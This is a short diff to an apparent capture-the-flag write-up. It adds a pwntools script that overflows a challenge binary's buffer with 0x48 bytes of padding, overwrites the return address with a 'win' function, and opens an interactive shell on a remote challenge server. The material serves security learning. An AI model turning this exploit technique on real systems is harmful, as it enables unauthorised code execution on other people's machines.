@@ -78,3 +78,17 @@ int win()
 
 It has `win` function. Do `Return Address Overwrite`(`RAO?`).
 
+```python
+from pwn import *
+
+p = remote('20.84.72.194', 5000)
+e = ELF('./prob')
+
+p.sendlineafter(b': ', b'a' * 0x48 + p64(e.sym['win']))
+p.interactive()
+```
+
+---
+
+# jail!
+
